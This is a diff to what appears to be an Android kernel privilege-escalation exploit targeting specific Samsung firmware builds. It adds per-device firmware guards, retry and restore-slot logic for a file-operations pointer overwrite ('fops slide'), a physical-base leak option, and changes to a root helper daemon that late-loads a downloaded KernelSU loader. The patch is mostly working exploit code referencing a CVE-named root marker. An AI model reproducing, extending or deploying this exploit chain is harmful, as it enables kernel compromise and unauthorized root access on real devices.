@@ -1,0 +1,287 @@
+diff --git a/Makefile b/Makefile
+index c111122..b7eb9b9 100644
+--- a/Makefile
++++ b/Makefile
+@@ -3,6 +3,10 @@ TARGET ?= pa3q-S938NKSUACZF1
+ OUTDIR ?= build/$(TARGET)
+ 
+ APP_TARGET_CFLAGS :=
++ROOT_HELPER_TARGET_CFLAGS :=
++ifeq ($(TARGET),e3q-S928NKSU6EZIF)
++ROOT_HELPER_TARGET_CFLAGS := -DKSUD_LATE_LOAD_EPHEMERAL=0
++endif
+ ifeq ($(TARGET),dm2q-S916BXXSAFZG1)
+ APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
+ endif
+@@ -55,6 +59,7 @@ PRELOAD_SRCS := \
+   src/preload.c
+ 
+ APP_PRELOAD_SRCS := \
++  src/target_guard.c \
+   src/main.c \
+   src/util.c \
+   src/slide_app.c \
+@@ -98,7 +103,7 @@ $(PRELOAD): $(PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kerne
+ 	  -shared -pthread -o $@
+ 
+ $(ROOT_HELPER): src/su_daemon.c | $(OUTDIR)
+-	$(TARGET_CC) -fPIE -pie -O2 -g0 -Wall -Wextra $< -ldl -o $@
++	$(TARGET_CC) -fPIE -pie -O2 -g0 -Wall -Wextra $(ROOT_HELPER_TARGET_CFLAGS) $< -ldl -o $@
+ 
+ $(APP_PRELOAD): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
+ 	$(TARGET_CC) -DAPP_PAYLOAD=1 $(APP_TARGET_CFLAGS) -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
+diff --git a/src/common.h b/src/common.h
+index 44e93ac..8933be1 100644
+--- a/src/common.h
++++ b/src/common.h
+@@ -405,7 +405,8 @@ int select_slide_payload_index(size_t index);
+ int app_trigger_fops_slide_route(void);
+ #if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
+     (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+-     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
++     APP_FOPS_DATA_ALIAS_DIAG_ONLY) || \
++    (defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT)
+ int app_trigger_fops_oracle_slot(size_t slot);
+ #endif
+ #endif
+diff --git a/src/main.c b/src/main.c
+index e5d0c84..5753a66 100644
+--- a/src/main.c
++++ b/src/main.c
+@@ -635,6 +635,12 @@ int run_exploit(int argc, char **argv) {
+     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+             "step=%d errno=%d\n",
+             attempt, triggered, verified, cfi_last_step, cfi_last_errno);
++#if defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT
++    if (triggered && !verified) {
++      int restored = app_trigger_fops_oracle_slot(1);
++      pr_info("app fops restore slot=1 attempted=%d\n", restored);
++    }
++#endif
+     if (verified || cfi_dirty_seen) {
+       break;
+     }
+diff --git a/src/preload.c b/src/preload.c
+index 4074ee1..54ff776 100644
+--- a/src/preload.c
++++ b/src/preload.c
+@@ -235,8 +235,12 @@ __attribute__((constructor)) static void load(void) {
+ 
+ #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+     if (atomic_load(&app_p0_state->writer_started)) {
++#if defined(APP_P0_RETRY_AFTER_WRITER) && APP_P0_RETRY_AFTER_WRITER
++      pr_warning("stack writer ran; target permits another independent attempt\n");
++#else
+       pr_error("stack writer ran; refusing retry on this boot\n");
+       break;
++#endif
+     }
+ #endif
+ 
+diff --git a/src/slide_app.c b/src/slide_app.c
+index b7b871c..80829c8 100644
+--- a/src/slide_app.c
++++ b/src/slide_app.c
+@@ -1206,8 +1206,18 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
+           atomic_load(&slide_consume_last_sched_ret),
+           atomic_load(&slide_consume_last_sched_errno));
+ #endif
+-  atomic_store(&slide_stack_write_window,
+-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
++  int route_window = ret > 0 && atomic_load(&slide_consume_sched_ok) > 0;
++#if defined(APP_EZIF_VERIFY_PSELECT_TIMEOUT) && \
++    APP_EZIF_VERIFY_PSELECT_TIMEOUT
++  if (ret == 0 && atomic_load(&slide_consume_sched_ok) > 0 &&
++      atomic_load(&slide_consume_calls) == 1 &&
++      atomic_load(&slide_consume_last_sched_ret) == 0) {
++    pr_info("EZIF pselect timeout candidate; requiring FOPS readback\n");
++    route_window = 1;
++  }
++  atomic_store(&slide_pselect_write_window, route_window);
++#endif
++  atomic_store(&slide_stack_write_window, route_window);
+ 
+   close(high_read);
+   if (block_fd != pipefd[0]) {
+@@ -2324,13 +2334,14 @@ int app_trigger_fops_slide_route(void) {
+ 
+ #if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
+     (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+-     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
++     APP_FOPS_DATA_ALIAS_DIAG_ONLY) || \
++    (defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT)
+ int app_trigger_fops_oracle_slot(size_t slot) {
+   return app_trigger_fops_slide_slot(slot);
+ }
+ #endif
+ #else
+-int app_trigger_fops_slide_route(void) {
++static int app_trigger_fops_slide_route_slot(size_t slot) {
+   static size_t delay_index;
+   static const int delays[] = {
+     70000, 60000, 80000, 40000, 90000, 50000,
+@@ -2340,7 +2351,7 @@ int app_trigger_fops_slide_route(void) {
+   slide_oracle_parent = fake_fops;
+   slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+ #else
+-  if (!select_slide_payload_index(0)) {
++  if (!select_slide_payload_index(slot)) {
+     return 0;
+   }
+ #endif
+@@ -2394,6 +2405,16 @@ int app_trigger_fops_slide_route(void) {
+   return slide_trigger_physical_state();
+ #endif
+ }
++
++int app_trigger_fops_slide_route(void) {
++  return app_trigger_fops_slide_route_slot(0);
++}
++
++#if defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT
++int app_trigger_fops_oracle_slot(size_t slot) {
++  return app_trigger_fops_slide_route_slot(slot);
++}
++#endif
+ #endif
+ 
+ static int slide_leak_physical_base(void) {
+@@ -2413,6 +2434,10 @@ static int slide_leak_physical_base(void) {
+ #endif
+   } else {
+     pr_warning("slide tracefs pre-oracle unavailable; using physical scan\n");
++#if defined(APP_EZIF_TRACEFS_ONLY) && APP_EZIF_TRACEFS_ONLY
++    pr_error("tracefs-only target refused the physical P0 fallback\n");
++    return 0;
++#endif
+   }
+ #endif
+   if (!prepare_p0_pipe_oracle()) {
+diff --git a/src/su_daemon.c b/src/su_daemon.c
+index 2cc6950..14abc22 100644
+--- a/src/su_daemon.c
++++ b/src/su_daemon.c
+@@ -29,6 +29,9 @@
+ #define SH_PATH "/system/bin/sh"
+ #define KSU_LOADER_PATH "/data/local/tmp/ksud-s25u-kdp"
+ #define LOGCAT_PATH "/system/bin/logcat"
++#ifndef KSUD_LATE_LOAD_EPHEMERAL
++#define KSUD_LATE_LOAD_EPHEMERAL 1
++#endif
+ #define BOOTSTRAP_MARKER_CONFIG "/data/local/tmp/cve43499-root-marker-path"
+ 
+ static uid_t allowed_client_uid = 2000;
+@@ -478,11 +481,16 @@ static int run_kernelsu_late_load(struct su_request *request, int conn) {
+       _exit(12);
+     }
+     if (loader == 0) {
+-      /* Let the downloaded target-specific ksud select its embedded module
+-       * from the running kernel.  Ephemeral mode avoids replacing an existing
+-       * /data/adb/ksud while the app only needs the module for this boot. */
++      /* Let the downloaded target-specific ksud select its embedded module.
++       * Some target ksud builds (including EZIF/KTC) do not support the
++       * optional ephemeral flag, so keep it configurable per target. */
++#if KSUD_LATE_LOAD_EPHEMERAL
+       execl(LOGCAT_PATH, "logcat", "late-load", "--ephemeral",
+             "--package-name", "me.weishu.kernelsu", (char *)NULL);
++#else
++      execl(LOGCAT_PATH, "logcat", "late-load",
++            "--package-name", "me.weishu.kernelsu", (char *)NULL);
++#endif
+       dprintf(STDERR_FILENO, "late-load: exec: %s\n", strerror(errno));
+       _exit(12);
+     }
+diff --git a/src/util.c b/src/util.c
+index 5f84362..872ab1b 100644
+--- a/src/util.c
++++ b/src/util.c
+@@ -1756,6 +1756,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
+ #else
+     slide_bank_parents[0] = fake_fops;
+     slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
++#if defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT
++    slide_bank_parents[1] = canon_addr(ASHMEM_FOPS);
++    slide_bank_targets[1] = data_addr(ASHMEM_MISC_FOPS);
++#endif
+ #endif
+ #else
+     slide_oracle_parent = fake_fops;
+@@ -1899,6 +1903,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
+       put_slide_bank_entry(p, payload_base, 0,
+                            slide_bank_parents[0],
+                            slide_bank_targets[0]);
++#if defined(APP_FOPS_RESTORE_SLOT) && APP_FOPS_RESTORE_SLOT
++      put_slide_bank_entry(p, payload_base, 1,
++                           slide_bank_parents[1],
++                           slide_bank_targets[1]);
++#endif
+ #endif
+ #endif
+     }
+diff --git a/src/target_guard.c b/src/target_guard.c
+new file mode 100644
+index 0000000..686a131
+--- /dev/null
++++ b/src/target_guard.c
+@@ -0,0 +1,61 @@
++#include "common.h"
++
++#if defined(TARGET_GUARD_MODEL) && defined(TARGET_GUARD_DEVICE) && \
++    defined(TARGET_GUARD_BUILD) && defined(TARGET_GUARD_FINGERPRINT) && \
++    defined(TARGET_GUARD_KERNEL) && defined(TARGET_GUARD_PATCH)
++
++#include <sys/system_properties.h>
++#include <sys/utsname.h>
++
++struct target_guard_property {
++  const char *name;
++  const char *expected;
++};
++
++static const struct target_guard_property target_guard_properties[] = {
++    {"ro.product.model", TARGET_GUARD_MODEL},
++    {"ro.product.device", TARGET_GUARD_DEVICE},
++    {"ro.build.display.id", TARGET_GUARD_BUILD},
++    {"ro.build.fingerprint", TARGET_GUARD_FINGERPRINT},
++    {"ro.build.version.security_patch", TARGET_GUARD_PATCH},
++#if defined(TARGET_GUARD_ANDROID_RELEASE)
++    {"ro.build.version.release", TARGET_GUARD_ANDROID_RELEASE},
++#endif
++#if defined(TARGET_GUARD_SDK)
++    {"ro.build.version.sdk", TARGET_GUARD_SDK},
++#endif
++#if defined(TARGET_GUARD_SALES_CODE)
++    {"ro.csc.sales_code", TARGET_GUARD_SALES_CODE},
++    {"ro.boot.sales_code", TARGET_GUARD_SALES_CODE},
++#endif
++};
++
++__attribute__((constructor(101))) static void target_guard_verify(void) {
++  for (size_t i = 0;
++       i < sizeof(target_guard_properties) / sizeof(target_guard_properties[0]);
++       i++) {
++    const struct target_guard_property *check = &target_guard_properties[i];
++    char actual[PROP_VALUE_MAX];
++    int len = __system_property_get(check->name, actual);
++    if (len < 0) {
++      actual[0] = '\0';
++    }
++    if (strcmp(actual, check->expected) != 0) {
++      fprintf(stderr, "[!] target guard mismatch %s: got=%s expected=%s\n",
++              check->name, actual, check->expected);
++      fflush(NULL);
++      _exit(1);
++    }
++  }
++
++  struct utsname uts;
++  if (uname(&uts) != 0 || strcmp(uts.release, TARGET_GUARD_KERNEL) != 0) {
++    fprintf(stderr, "[!] target guard kernel release mismatch\n");
++    fflush(NULL);
++    _exit(1);
++  }
++
++  printf("[+] target guard exact firmware and boot checks passed\n");
++}
++
++#endif
